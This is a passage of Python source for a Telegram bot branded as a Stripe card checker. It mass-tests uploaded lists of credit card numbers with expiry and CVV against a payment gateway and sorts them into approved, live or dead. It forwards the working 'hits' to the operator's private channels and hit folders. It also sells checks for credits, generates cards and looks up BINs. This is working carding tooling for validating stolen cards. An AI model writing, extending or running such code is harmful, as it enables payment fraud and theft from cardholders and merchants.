    cvv = 0

    # Process cards
    for i, card in enumerate(cards):
        # Check if cancelled
        if user_id in checking_tasks and checking_tasks[user_id].get("cancelled"):
            break

        # Update status every 5 cards
        if i % 5 == 0 or i == len(cards) - 1:
            elapsed = time.time() - checking_tasks[user_id]["start_time"]
            progress = (processed / len(cards)) * 100

            status_text = f"""🚀 Mass Check Progress
File ID: {file_id}
Progress: {progress:.1f}%
Processed: {processed}/{len(cards)}

Results:
✅ Approved: {approved}
🔥 Live: {live}
❌ Dead: {dead}
🔢 CCN: {ccn}
💳 CVV: {cvv}
"""
            try:
                await status_msg.edit_text(status_text)
            except:
                pass

        # Check card (NO LUHN VALIDATION)
        start_time = time.time()
        result_card, status, message, http_code = await check_single_card_fast(card)
        actual_time = time.time() - start_time

        processed += 1

        # Update counters
        if status == "approved":
            approved += 1
            approved_hits.append(card)
        elif status == "live":
            live += 1
            live_hits.append(card)
        elif status == "dead":
            dead += 1
        elif status == "ccn":
            ccn += 1
        elif status == "cvv":
            cvv += 1

        # Send individual result for approved/live cards
        if status in ["approved", "live"]:
            result_text = format_universal_result(
                card_data=card,
                status=status,
                message=message,
                gateway="Stripe Auth",
                username=file_info["username"],
                time_taken=actual_time,
            )
            await context.bot.send_message(
                chat_id=APPROVED_LOG_CHANNEL,
                text=result_text,
                parse_mode=ParseMode.HTML,
            )

        # Small delay
        if i < len(cards) - 1:
            await asyncio.sleep(random.uniform(0.5, 0.8))

    # Save hits to files
    if approved_hits:
        with open(f"{PRIVATE_HITS_FOLDER}/{file_id}_approved.txt", "w", encoding="utf-8") as f:
            f.write("\n".join(approved_hits))

    if live_hits:
        with open(f"{PRIVATE_HITS_FOLDER}/{file_id}_live.txt", "w", encoding="utf-8") as f:
            f.write("\n".join(live_hits))

    # Send files to log channels
    try:
        # Send approved hits to approved channel
        if approved_hits and APPROVED_LOG_CHANNEL:
            approved_content = "\n".join(approved_hits)
            approved_file = BytesIO(approved_content.encode())
            approved_file.name = f"{file_id}_approved.txt"
            await context.bot.send_document(
                chat_id=APPROVED_LOG_CHANNEL,
                document=approved_file,
                caption=f"✅ Approved Cards\nFile ID: {file_id}\nUser: @{file_info['username']}\nCount: {approved}",
            )

        # Send live hits to live channel
        if live_hits and PRIVATE_LOG_CHANNEL:
            live_content = "\n".join(live_hits)
            live_file = BytesIO(live_content.encode())
            live_file.name = f"{file_id}_live.txt"
            await context.bot.send_document(
                chat_id=PRIVATE_LOG_CHANNEL,
                document=live_file,
                caption=f"🔥 Live Cards\nFile ID: {file_id}\nUser: @{file_info['username']}\nCount: {live}",
            )
    except Exception as e:
        logger.error(f"Error sending to log channels: {e}")

    # Final summary
    elapsed = time.time() - checking_tasks[user_id]["start_time"]
    # Final summary in mass check tasks
    summary = f"""✅ MASS CHECK COMPLETE
Total Cards: {len(cards)}
Processed: {processed}
Time: {elapsed:.1f}s
━━━━━━━━━━━━━━━━━━━━
FINAL RESULTS:
✅ Approved: {approved} cards
🔥 Live: {live} cards
❌ Declined: {dead} cards
🔢 CCN: {ccn} cards
💳 CVV: {cvv} cards
⚠️ Risk: {risk} cards
🚫 Fraud: {fraud} cards
━━━━━━━━━━━━━━━━━━━━
• User: @{username}
━━━━━━━━━━━━━━━━━━━━
🤖 @DARKXCODE_STRIPE_BOT
"""

    await status_msg.edit_text(summary)

    # Cleanup
    if user_id in checking_tasks:
        del checking_tasks[user_id]
    if user_id in files_storage:
        del files_storage[user_id]


async def setcr_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin: Set user credits"""
    user_id = update.effective_user.id

    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Admin only command.")
        return

    if len(context.args) != 2:
        await update.message.reply_text(
            "*❌ Usage:* `/setcr user_id amount`\n"
            "*Example:* `/setcr 123456789 100`\n\n"
            "This sets the user's credits to exactly 100.",
            parse_mode=ParseMode.MARKDOWN,
        )
        return

    try:
        target_user_id = int(context.args[0])
        amount = int(context.args[1])

        if amount < 0:
            await update.message.reply_text("❌ Amount must be positive or zero.")
            return

        user = await get_user(target_user_id)
        await update_user(target_user_id, {"credits": amount})
        user = await get_user(target_user_id)  # Refresh

        await update.message.reply_text(
            f"*✅ CREDITS SET*\n"
            f"══════════════════════\n"
            f"*User:* `{target_user_id}`\n"
            f"*Set to:* {amount} credits\n"
            f"*New Balance:* {user['credits']} credits",
            parse_mode=ParseMode.MARKDOWN,
        )

        # Notify user
        try:
            await context.bot.send_message(
                chat_id=target_user_id,
                text=f"*🎉 CREDITS UPDATED*\n\n"
                f"Your credits have been set to *{amount} credits* by admin!\n"
                f"New balance: *{user['credits']} credits*",
                parse_mode=ParseMode.MARKDOWN,
            )
        except:
            pass  # User might have blocked bot

    except ValueError:
        await update.message.reply_text("❌ Invalid user ID or amount.")


async def claim_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /claim command for gift codes"""
    user_id = update.effective_user.id
    user = await get_user(user_id)

    if not user["joined_channel"]:
        await update.message.reply_text(
            "❌ Please join our private channel first using /start",
            parse_mode=ParseMode.MARKDOWN,
        )
        return

    if not context.args:
        await update.message.reply_text(
            "*❌ Usage:* `/claim CODE`\n\n"
            "*Example:* `/claim ABC123XYZ456DEF7`\n\n"
            "Ask admin for gift codes or wait for announcements.",
            parse_mode=ParseMode.MARKDOWN,
        )
        return

    code = context.args[0].upper().strip()

    # Check if code exists
    gift_code = await get_gift_code(code)
    if not gift_code:
        await update.message.reply_text(
            f"*❌ INVALID GIFT CODE*\n\n"
            f"Code `{code}` not found or expired.\n"
            f"Make sure you entered it correctly.",
            parse_mode=ParseMode.MARKDOWN,
        )
        return

    # Check if user already claimed this code (Firebase version)
    db = get_db()
    if db:
        try:
            claimed_ref = db.collection("user_claimed_codes").document(
                f"{user_id}_{code}"
            )
            claimed_doc = claimed_ref.get()

            if claimed_doc.exists:
                await update.message.reply_text(
                    f"*❌ ALREADY CLAIMED*\n\n"
                    f"You have already claimed gift code `{code}`.\n"
                    f"Each user can claim a code only once.",
                    parse_mode=ParseMode.MARKDOWN,
                )
                return
        except Exception as e:
            logger.error(f"Firebase error checking claimed codes: {e}")
    else:
        # In-memory check
        if (
            user_id in in_memory_claimed_codes
            and code in in_memory_claimed_codes[user_id]
        ):
            await update.message.reply_text(
                f"*❌ ALREADY CLAIMED*\n\n"
                f"You have already claimed gift code `{code}`.\n"
                f"Each user can claim a code only once.",
                parse_mode=ParseMode.MARKDOWN,
            )
            return

    # Check max uses
    if gift_code["max_uses"] and gift_code["uses"] >= gift_code["max_uses"]:
        await update.message.reply_text(
            f"*❌ CODE LIMIT REACHED*\n\n"
            f"Code `{code}` has been claimed too many times.",
            parse_mode=ParseMode.MARKDOWN,
        )
        return

    # Add credits to user
    credits_to_add = gift_code["credits"]
    await update_user(user_id, {"credits": user["credits"] + credits_to_add})

    # Update gift code usage
    await update_gift_code_usage(code, user_id)

    # Refresh user data
    user = await get_user(user_id)

    await update.message.reply_text(
        f"*🎉 GIFT CODE CLAIMED!*\n"
        f"══════════════════════\n"
        f"*Code:* `{code}`\n"
        f"*Credits added:* {credits_to_add}\n"
        f"*New balance:* {user['credits']} credits\n\n"
        f"Thank you for using {BOT_INFO['name']}!",
        parse_mode=ParseMode.MARKDOWN,
    )


# ==================== ADMIN COMMANDS ====================


async def addcr_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin: Add credits to user"""
    user_id = update.effective_user.id

    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Admin only command.")
        return

    if len(context.args) != 2:
        await update.message.reply_text(
            "*❌ Usage:* `/addcr user_id amount`\n" "*Example:* `/addcr 123456789 100`",
            parse_mode=ParseMode.MARKDOWN,
        )
        return

    try:
        target_user_id = int(context.args[0])
        amount = int(context.args[1])

        if amount <= 0:
            await update.message.reply_text("❌ Amount must be positive.")
            return

        user = await get_user(target_user_id)
        await update_user(target_user_id, {"credits": user["credits"] + amount})
        user = await get_user(target_user_id)  # Refresh

        await update.message.reply_text(
            f"*✅ CREDITS ADDED*\n"
            f"══════════════════════\n"
            f"*User:* `{target_user_id}`\n"
            f"*Added:* {amount} credits\n"
            f"*New Balance:* {user['credits']} credits",
            parse_mode=ParseMode.MARKDOWN,
        )

        # Notify user
        try:
            await context.bot.send_message(
                chat_id=target_user_id,
                text=f"*🎉 CREDITS ADDED*\n\n"
                f"You received *{amount} credits* from admin!\n"
                f"New balance: *{user['credits']} credits*",
                parse_mode=ParseMode.MARKDOWN,
            )
        except:
            pass  # User might have blocked bot

    except ValueError:
        await update.message.reply_text("❌ Invalid user ID or amount.")


async def gengift_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin: Generate gift code"""
    user_id = update.effective_user.id

    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Admin only command.")
        return

    if len(context.args) != 2:
        await update.message.reply_text(
            "*❌ Usage:* `/gengift credits max_uses`\n"
            "*Example:* `/gengift 50 10`\n"
            "Creates a code worth 50 credits, usable 10 times.",
            parse_mode=ParseMode.MARKDOWN,
        )
        return

    try:
        credits = int(context.args[0])
        max_uses = int(context.args[1])

        if credits <= 0 or max_uses <= 0:
            await update.message.reply_text("❌ Credits and max uses must be positive.")
            return

        # Generate unique code
        code = generate_gift_code()
        gift_code = await get_gift_code(code)
        while gift_code:
            code = generate_gift_code()
            gift_code = await get_gift_code(code)

        # Create gift code
        await create_gift_code(code, credits, max_uses, user_id)

        await update.message.reply_text(
            f"*🎁 GIFT CODE GENERATED*\n"
            f"══════════════════════\n"
            f"*Code:* `{code}`\n"
            f"*Credits:* {credits}\n"
            f"*Max Uses:* {max_uses}\n"
            f"*Created:* {datetime.datetime.now().strftime('%Y-%m-%d %H:%M')}\n\n"
            f"Share with users:\n"
            f"`/claim {code}`",
            parse_mode=ParseMode.MARKDOWN,
        )

    except ValueError:
        await update.message.reply_text("❌ Invalid credits or max uses.")


async def listgifts_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin: List all gift codes"""
    user_id = update.effective_user.id

    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Admin only command.")
        return

    gift_codes_list = await get_all_gift_codes()

    if not gift_codes_list:
        await update.message.reply_text("📭 No gift codes generated yet.")
        return

    response = "*🎁 ACTIVE GIFT CODES*\n══════════════════════\n"

    for gift in gift_codes_list[:20]:
        uses_left = (
            gift.get("max_uses", 0) - gift.get("uses", 0)
            if gift.get("max_uses")
            else "Unlimited"
        )
        uses = gift.get("uses", 0)
        credits = gift.get("credits", 0)
        code = gift.get("code", "Unknown")
        response += f"• `{code}` - {credits} credits ({uses}/{uses_left} used)\n"

    if len(gift_codes_list) > 20:
        response += f"\n... and {len(gift_codes_list) - 20} more codes"

    await update.message.reply_text(response, parse_mode=ParseMode.MARKDOWN)


async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /cancel command - Cancel ongoing mass check"""
    user_id = update.effective_user.id

    if user_id not in checking_tasks:
        await update.message.reply_text(
            "*ℹ️ NO ACTIVE CHECK*\n" "You don't have any ongoing mass check.",
            parse_mode=ParseMode.MARKDOWN,
        )
        return

    if checking_tasks[user_id]["cancelled"]:
        await update.message.reply_text(
            "*ℹ️ ALREADY CANCELLED*\n" "Your mass check is already being cancelled.",
            parse_mode=ParseMode.MARKDOWN,
        )
        return

    checking_tasks[user_id]["cancelled"] = True

    await update.message.reply_text(
        "*🛑 CANCELLATION REQUESTED*\n"
        "Your mass check will be cancelled shortly.\n"
        "You'll receive a summary when it's complete.",
        parse_mode=ParseMode.MARKDOWN,
    )


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /help command"""
    # Get user ID from either message or callback query
    if update.message:
        user_id = update.effective_user.id
        user_name = update.effective_user.first_name or "User"
    elif update.callback_query:
        user_id = update.callback_query.from_user.id
        user_name = update.callback_query.from_user.first_name or "User"
    else:
        return

    # Get user data
    user = await get_user(user_id)

    # Get user stats
    user_credits = user.get("credits", 0)
    approved_cards = user.get("approved_cards", 0)
    declined_cards = user.get("declined_cards", 0)
    total_checks = user.get("total_checks", 0)

    # Check if user is admin
    is_admin = user_id in ADMIN_IDS

    # Different help for admin vs regular users
    if is_admin:
        help_text = f"""<b>⚡ DARKXCODE STRIPE CHECKER ⚡</b>
══════════════════════
👋 <b>Welcome, {escape_markdown_v2(user_name)}!</b>

<b>Account Overview:</b>
• Credits: <b>{user_credits}</b>
• Today: Approved {approved_cards} Declined {declined_cards}
• Total Checks: <b>{total_checks}</b>

<b>User Commands:</b>
• <code>/gen</code> - Generate Cards
• <code>/chk cc|mm|yy|cvv</code> - Check Single Card (Private)
• <code>/pchk cc|mm|yy|cvv</code> - Check Single Card (Public)
• <code>/mchk</code> - Upload File For Mass Check (Private)
• <code>/pmchk</code> - Upload File For Mass Check (Public)
• <code>/vbv</code> - Check Card Security
• <code>/daily</code> - Claim Daily Credits
• <code>/dailytop</code> - Check Daily Leaderboard
• <code>/credits</code> - Check Credits
• <code>/plans</code> - Check Plans
• <code>/claim CODE</code> - Redeem Gift Code
• <code>/info</code> - Bot Information
• <code>/invite</code> - Invite Friends & Earn Credits
• <code>/cancel</code> - Cancel Mass Check
• <code>/help</code> - See All Commands

<b>Admin Commands:</b>
• <code>/addcr user_id amount</code> - Add Credits
• <code>/setcr user_id amount</code> - Set Credits
• <code>/setplan</code> - Set User Plan
• <code>/gengift credits max_uses</code> - Create Gift Code
• <code>/listgifts</code> - List All Gift Codes
• <code>/userinfo user_id</code> - View User Info
• <code>/botinfo</code> - Bot Statistics
• <code>/admin</code> - List All Admin CMD
• <code>/testaccess</code> - Check Channel Access
• <code>/testenc</code> - Check Encrypt Code
• <code>/checkdb</code> - Check DB Health
• <code>/createdb</code> - Create DB Collection
• <code>/backupdb</code> - Backup DB Data
• <code>/resetall</code> - Reset Full DB

<b>Owner:</b> 👑 @ISHANT_OFFICIAL
══════════════════════
"""
    else:
        help_text = f"""<b>⚡ DARKXCODE STRIPE CHECKER ⚡</b>
══════════════════════
👋 <b>Welcome, {escape_markdown_v2(user_name)}!</b>

<b>Account Overview:</b>
• Credits: <b>{user_credits}</b>
• Today: ✅{approved_cards} ❌{declined_cards}
• Total Checks: <b>{total_checks}</b>

<b>User Commands:</b>
• <code>/gen</code> - Generate Cards
• <code>/chk cc|mm|yy|cvv</code> - Check Single Card (Private)
• <code>/pchk cc|mm|yy|cvv</code> - Check Single Card (Public)
• <code>/mchk</code> - Upload File For Mass Check (Private)
• <code>/pmchk</code> - Upload File For Mass Check (Public)
• <code>/vbv</code> - Check Card Security
• <code>/daily</code> - Claim Daily Credits
• <code>/dailytop</code> - Check Daily Leaderboard
• <code>/credits</code> - Check Credits
• <code>/plans</code> - Check Plans
• <code>/claim CODE</code> - Redeem Gift Code
• <code>/info</code> - Bot Information
• <code>/invite</code> - Invite Friends & Earn Credits
• <code>/cancel</code> - Cancel Mass Check
• <code>/help</code> - See All Commands

<b>Owner:</b> 👑 @ISHANT_OFFICIAL
══════════════════════
"""

    # Send the message using HTML parsing
    try:
        if update.message:
            await update.message.reply_text(
                help_text,
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup(
                    [[InlineKeyboardButton("🔙 Back", callback_data="back_to_start")]]
                ),
            )
        elif update.callback_query:
            await update.callback_query.edit_message_text(
                help_text,
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup(
                    [[InlineKeyboardButton("🔙 Back", callback_data="back_to_start")]]
                ),
            )
    except Exception as e:
        logger.error(f"Error in help command: {e}")
        # Fallback to plain text
        if update.message:
            await update.message.reply_text(
                help_text.replace("<b>", "")
                .replace("</b>", "")
                .replace("<code>", "")
                .replace("</code>", ""),
                reply_markup=InlineKeyboardMarkup(
                    [[InlineKeyboardButton("🔙 Back", callback_data="back_to_start")]]
                ),
            )
        elif update.callback_query:
            await update.callback_query.edit_message_text(
                help_text.replace("<b>", "")
                .replace("</b>", "")
                .replace("<code>", "")
                .replace("</code>", ""),
                reply_markup=InlineKeyboardMarkup(
                    [[InlineKeyboardButton("🔙 Back", callback_data="back_to_start")]]
                ),
            )


async def verify_join_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle verify join callback"""
    query = update.callback_query

    try:
        await query.answer()
    except BadRequest:
        pass

    user_id = query.from_user.id
    await update_user(user_id, {"joined_channel": True})

    await query.edit_message_text(
        "*✅ ACCESS GRANTED*\n"
        "══════════════════════\n"
        "Channel membership verified successfully!\n"
        "You now have full access to all features.\n\n"
        "Use `/help` to see available commands.",
        parse_mode=ParseMode.MARKDOWN,
    )


async def claim_gift_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle claim gift callback"""
    query = update.callback_query

    try:
        await query.answer("Use /claim CODE to redeem gift code")
    except BadRequest:
        pass

    await query.edit_message_text(
        "*💰 CLAIM GIFT CODE*\n"
        "══════════════════════\n"
        "To claim a gift code, use:\n"
        "`/claim CODE`\n\n"
        "*Example:*\n"
        "`/claim ABC123XYZ456DEF7`\n\n"
        "*Note:* Each code can be claimed only once per user.\n"
        "Ask admin for gift codes or wait for announcements.",
        parse_mode=ParseMode.MARKDOWN,
    )


async def userinfo_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /userinfo command - Admin view user info"""
    if update.message:
        user_id = update.effective_user.id
        message = update.message
    else:
        return

    if user_id not in ADMIN_IDS:
        await message.reply_text(
            "❌ This command is for administrators only.", parse_mode=ParseMode.HTML
        )
        return

    if not context.args:
        await message.reply_text(
            "<b>❌ Usage:</b> <code>/userinfo user_id</code>\n"
            "<b>Example:</b> <code>/userinfo 123456789</code>",
            parse_mode=ParseMode.HTML,
        )
        return

    try:
        target_user_id = int(context.args[0])
        user = await get_user(target_user_id)

        # Get claimed codes from Firebase
        claimed_codes = []
        db_connection = get_db()
        if db_connection:
            try:
                claimed_ref = db_connection.collection("user_claimed_codes")
                claimed_docs = claimed_ref.where(
                    "user_id", "==", target_user_id
                ).stream()

                for doc in claimed_docs:
                    data = doc.to_dict()
                    if "code" in data:
                        claimed_codes.append(data["code"])
            except Exception as e:
                logger.error(f"Error fetching claimed codes: {e}")

        # Calculate success rate
        total_user_checks = user.get("total_checks", 0)
        approved_cards = user.get("approved_cards", 0)
        success_rate = (
            (approved_cards / total_user_checks * 100) if total_user_checks > 0 else 0
        )

        # Get referrer info if exists
        referrer_info = ""
        if user.get("referrer_id"):
            referrer = await get_user(user["referrer_id"])
            referrer_name = referrer.get("username", "N/A")
            referrer_info = (
                f"\n<b>Referred by:</b> @{referrer_name} ({user['referrer_id']})"
            )

        # Format dates
        joined_date = user.get("joined_date", "N/A")
        if isinstance(joined_date, datetime.datetime):
            joined_date = joined_date.strftime("%Y-%m-%d")
        elif isinstance(joined_date, str) and len(joined_date) >= 10:
            joined_date = joined_date[:10]

        last_active = user.get("last_active", "Never")
        if isinstance(last_active, datetime.datetime):
            last_active = last_active.strftime("%Y-%m-%d %H:%M:%S")
        elif isinstance(last_active, str) and len(last_active) >= 19:
            last_active = last_active[:19]

        user_info = f"""<b>👤 USER INFO (ADMIN)</b>
══════════════════════
<b>User ID:</b> <code>{target_user_id}</code>
<b>Username:</b> @{user.get('username', 'N/A')}
<b>Name:</b> {user.get('first_name', 'N/A')}
<b>Joined:</b> {joined_date}
<b>Channel:</b> {'✅ Joined' if user.get('joined_channel', False) else '❌ Not Joined'}
<b>Last Active:</b> {last_active}
{referrer_info}

<b>Credits:</b> {user.get('credits', 0)}
<b>Credits Spent:</b> {user.get('credits_spent', 0)}

<b>Statistics:</b>
• Total Checks: {total_user_checks}
• Today's Checks: {user.get('checks_today', 0)}
• ✅ Approved: {approved_cards}
• ❌ Declined: {user.get('declined_cards', 0)}
• Success Rate: {success_rate:.1f}%

<b>Referrals:</b> {user.get('referrals_count', 0)} users
<b>Earned from Referrals:</b> {user.get('earned_from_referrals', 0)} credits

<b>Claimed Codes:</b> {len(claimed_codes)}
══════════════════════
"""
        if claimed_codes:
            user_info += "\n<b>Claimed Gift Codes:</b>\n"
            for code in claimed_codes[:10]:
                user_info += f"• <code>{code}</code>\n"
            if len(claimed_codes) > 10:
                user_info += f"• ... and {len(claimed_codes) - 10} more\n"

        await message.reply_text(user_info, parse_mode=ParseMode.HTML)

    except ValueError:
        await message.reply_text("❌ Invalid user ID.", parse_mode=ParseMode.HTML)
    except Exception as e:
        logger.error(f"Error in userinfo_command: {e}")
        await message.reply_text(
            "❌ An error occurred while fetching user info.", parse_mode=ParseMode.HTML
        )


# ==================== ADD MISSING MASS CHECK CALLBACK ====================

# ==================== MISSING CALLBACK FUNCTIONS ====================


async def start_mass_check_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start mass check from callback"""
    query = update.callback_query

    try:
        await query.answer()
    except BadRequest:
        pass

    user_id = query.from_user.id

    if user_id not in files_storage or "cards" not in files_storage[user_id]:
        await query.edit_message_text("❌ No cards found. Please upload file again.")
        return

    cards = files_storage[user_id]["cards"]
    user = await get_user(user_id)

    # Check if user has enough credits
    if user["credits"] < len(cards):
        await query.edit_message_text(
            f"*💰 INSUFFICIENT CREDITS*\n"
            f"══════════════════════\n"
            f"*Cards to check:* {len(cards)}\n"
            f"*Credits needed:* {len(cards)}\n"
            f"*Your credits:* {user['credits']}\n\n"
            f"You need {len(cards) - user['credits']} more credits.",
            parse_mode=ParseMode.MARKDOWN,
        )
        return

    # Create cancel button
    keyboard = [
        [
            InlineKeyboardButton(
                "🛑 CANCEL CHECK", callback_data=f"cancel_check_{user_id}"
            )
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    status_msg = await query.edit_message_text(
        f"*🚀 MASS CHECK STARTED*\n"
        f"══════════════════════\n"
        f"*Total Cards:* {len(cards)}\n"
        f"*Your Credits:* {user['credits']}\n"
        f"*Status:* ⚡ Processing Cards...\n\n"
        f"*Live Results:* Starting...\n"
        f"══════════════════════\n"
        f"✅ Approved: 0\n"
        f"❌ Declined: 0\n"
        f"⏳ Processed: 0/{len(cards)}",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup,
    )

    # Store task
    task = asyncio.create_task(
        mass_check_task_ultrafast(
            user_id, cards, status_msg, query.message.chat_id, context
        )
    )
    checking_tasks[user_id] = {
        "task": task,
        "cancelled": False,
        "cards_processed": 0,
        "total_cards": len(cards),
        "chat_id": query.message.chat_id,
        "message_id": query.message.message_id,
        "start_time": time.time(),
        "approved": 0,
        "declined": 0,
    }

    # Cleanup file storage
    if user_id in files_storage:
        del files_storage[user_id]


async def cancel_check_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle cancel check button"""
    query = update.callback_query

    try:
        await query.answer()
    except BadRequest:
        pass

    if query.data.startswith("cancel_check_"):
        try:
            user_id = int(query.data.split("_")[2])
        except:
            try:
                await query.answer("Invalid request", show_alert=True)
            except:
                pass
            return

        if user_id in checking_tasks:
            checking_tasks[user_id]["cancelled"] = True

            # Calculate used credits based on actual processing
            processed = checking_tasks[user_id]["cards_processed"]
            approved = checking_tasks[user_id].get("approved", 0)
            declined = checking_tasks[user_id].get("declined", 0)

            user = await get_user(user_id)
            used_credits = approved + declined  # Only actual checks count

            # Update user credits
            updates = {
                "credits": user["credits"] - used_credits,
                "credits_spent": user.get("credits_spent", 0) + used_credits,
                "checks_today": user.get("checks_today", 0) + processed,
                "total_checks": user["total_checks"] + processed,
                "approved_cards": user.get("approved_cards", 0) + approved,
                "declined_cards": user.get("declined_cards", 0) + declined,
                "last_check_date": datetime.datetime.now().date().isoformat(),
            }
            await update_user(user_id, updates)

            # Update bot statistics
            await update_bot_stats(
                {
                    "total_checks": processed,
                    "total_credits_used": used_credits,
                    "total_approved": approved,
                    "total_declined": declined,
                }
            )

            # Refresh user data
            user = await get_user(user_id)

            success_rate = (approved / processed * 100) if processed > 0 else 0

            await query.edit_message_text(
                f"*🛑 CHECK CANCELLED*\n"
                f"══════════════════════\n"
                f"*Results:*\n"
                f"• Processed: {processed} cards\n"
                f"• ✅ Approved: {approved}\n"
                f"• ❌ Declined: {declined}\n"
                f"• Credits Used: {used_credits}\n"
                f"• Success Rate: {success_rate:.1f}%\n\n"
                f"*New Balance:* {user['credits']} credits",
                parse_mode=ParseMode.MARKDOWN,
            )

            if user_id in checking_tasks:
                del checking_tasks[user_id]
        else:
            try:
                await query.answer("No active check found", show_alert=True)
            except:
                pass


async def test_simple_encryption(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Test the simple encryption system"""
    if update.effective_user.id not in ADMIN_IDS:
        return

    test_cases = [
        "4111111111111111|12|25|123",
        "5111111111111118|06|27|456",
        "371449635398431|09|26|7890",
    ]

    response = "🔐 *SIMPLE ENCRYPTION TEST*\n\n"

    for test_card in test_cases:
        encrypted = encrypt_card_data(test_card)
        response += f"*Original:* `{test_card}`\n"
        response += f"*Encrypted:* `{encrypted}`\n"
        response += f"*Length:* {len(encrypted)} chars\n\n"

    response += "*Website:* " + DECRYPTION_WEBSITE + "\n"
    response += "*Method:* ROT5 + Character substitution"

    await update.message.reply_text(response, parse_mode=ParseMode.MARKDOWN)


def log_file_upload(user_id: int, username: str, filename: str, card_count: int):
    """Log file upload activity"""
    try:
        log_entry = {
            "timestamp": dt.now().isoformat(),  # Use dt.now()
            "user_id": user_id,
            "username": username,
            "filename": filename,
            "card_count": card_count,
        }

        # Save to user log
        user_log_file = f"{USER_LOGS_FOLDER}/{user_id}.json"
        logs = []

        if os.path.exists(user_log_file):
            with open(user_log_file, "r", encoding="utf-8") as f:
                try:
                    logs = json.load(f)
                except:
                    logs = []

        logs.append(log_entry)

        # Keep only last 100 entries
        if len(logs) > 100:
            logs = logs[-100:]

        with open(user_log_file, "w", encoding="utf-8") as f:
            json.dump(logs, f, indent=2, ensure_ascii=False)

    except Exception as e:
        logger.error(f"Error logging file upload: {e}")


def save_hit_card(user_id: int, card: str, status: str, is_private: bool = False):
    """Save hit card to appropriate folder"""
    try:
        if status not in ["approved", "live"]:
            return

        # Determine folder
        folder = PRIVATE_HITS_FOLDER if is_private else PUBLIC_HITS_FOLDER
        Path(folder).mkdir(parents=True, exist_ok=True)

        # File name format: userid_date_status.txt
        date_str = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"{folder}/{user_id}_{date_str}_{status}.txt"

        # Append card to file
        with open(filename, "a", encoding="utf-8") as f:
            f.write(f"{card}\n")

    except Exception as e:
        logger.error(f"Error saving hit card: {e}")

async def send_to_log_channel(
    context,
    card: str,
    status: str,
    message: str,
    username: str,
    time_taken: float,
    is_private: bool = False,
):
    """Send encrypted hits to channel with decryption button"""
    try:
        # Parse card
        if "|" in card:
            cc, mon, year, cvv = card.split("|")
        else:
            # Try to parse using our helper
            cc, mon, year, cvv = parse_card_input(card)
            if not cc:
                logger.error(f"Could not parse card: {card}")
                return
        
        cc_clean = cc.replace(" ", "")

        # Encrypt the card data using SIMPLE method
        original_card = f"{cc}|{mon}|{year}|{cvv}"
        encrypted_card = encrypt_card_data(original_card)

        # Get BIN info
        bin_info = get_bin_info(cc_clean[:6])

        # Determine channel
        if is_private:
            channel_id = PRIVATE_LOG_CHANNEL
            channel_label = "PRIVATE"
        else:
            channel_id = APPROVED_LOG_CHANNEL
            channel_label = "PUBLIC"

        # Create encrypted message for channel
        channel_text = f"""
[↯] Card: <code>{encrypted_card}</code>
[↯] Status: {status.capitalize()}
[↯] Response: {message}
[↯] Gateway: Stripe Auth
- - - - - - - - - - - - - - - - - - - - - -
[↯] Bank: {bin_info['bank']}
[↯] Country: {bin_info['country']} {bin_info['country_flag']}
- - - - - - - - - - - - - - - - - - - - - -
[↯] 𝐓𝐢𝐦𝐞: {time_taken:.2f}s
- - - - - - - - - - - - - - - - - - - - - -
[↯] User : @{username or 'N/A'}
[↯] Made By: @ISHANT_OFFICIAL
[↯] Bot: @DARKXCODE_STRIPE_BOT
"""

        # Create inline keyboard with decrypt button
        keyboard = [[create_decryption_button(encrypted_card)]]
        reply_markup = InlineKeyboardMarkup(keyboard)

        # Send to channel
        await context.bot.send_message(
            chat_id=channel_id,
            text=channel_text,
            parse_mode=ParseMode.HTML,
            reply_markup=reply_markup,
        )

        logger.info(f"✓ Sent encrypted {channel_label} hit to channel")

    except Exception as e:
        logger.error(f"Error sending to log channel: {e}")

async def handle_file_upload_message(
    update: Update, context: ContextTypes.DEFAULT_TYPE
):
    """Handle file upload messages for both public and private checks"""
    if not update.message.document:
        return

    user_id = update.effective_user.id
    file = update.message.document
    username = update.effective_user.username or f"user_{user_id}"

    # Check if file is TXT
    if not file.file_name.lower().endswith(".txt"):
        await update.message.reply_text("❌ Please upload only .txt files")
        return

    try:
        # Download file
        file_obj = await context.bot.get_file(file.file_id)
        file_bytes = await file_obj.download_as_bytearray()
        file_content = file_bytes.decode("utf-8", errors="ignore")

        # Count cards
        cards = [line.strip() for line in file_content.split("\n") if line.strip()]
        valid_cards = []

        # Simple format check
        for card in cards:
            if "|" in card and len(card.split("|")) >= 4:
                valid_cards.append(card)

        if len(valid_cards) == 0:
            await update.message.reply_text("❌ No valid cards found in file")
            return

        # Generate unique file ID
        random_chars = "".join(
            random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=4)
        )
        file_id = f"{user_id}_{random_chars}"

        # Save to received folder
        received_filename = f"{RECEIVED_FOLDER}/{file_id}.txt"
        with open(received_filename, "w", encoding="utf-8") as f:
            f.write(file_content)

        # Store file info
        files_storage[user_id] = {
            "file_id": file_id,
            "received_file": received_filename,
            "username": username,
            "total_cards": len(valid_cards),
            "cards": valid_cards,
            "timestamp": time.time(),
        }

        await update.message.reply_text(
            f"✅ File received: `{file.file_name}`\n"
            f"📊 Valid cards: {len(valid_cards)}\n"
